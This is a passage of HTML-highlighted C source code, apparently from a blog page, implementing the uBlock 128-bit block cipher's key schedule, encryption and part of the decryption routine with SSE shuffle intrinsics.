class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xd</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_KeySchedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key)</span><span class=\"comment\">// 密钥生成函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i SK = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">9</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>);\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">15</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">2</span>,<span class=\"number\">11</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">14</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)key);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)Subkey[<span class=\"number\">0</span>], state1);</span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)RC[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state1);</span><br><span class=\"line\">\t\tt1 =  _mm_shuffle_epi8(S, k);</span><br><span class=\"line\">\t\tt2 = _mm_shuffle_epi8(SK, k);</span><br><span class=\"line\">\t\tt3 = _mm_shuffle_epi8(t1, c5);</span><br><span class=\"line\">\t\tt4 = _mm_shuffle_epi8(t2, c6);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state2);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\t\tstate1 = k;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)Subkey[i], state1);</span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Encrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">int</span> round)</span><span class=\"comment\">//uBlock加密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)plain);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; round; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S, state1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(S, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(round == <span class=\"number\">16</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[round]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[round] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)cipher, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Decrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">int</span> round)</span><span class=\"comment\">// uBlock解密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)cipher);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = round; i &gt; <span class=\"number\">0</span>; i--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span 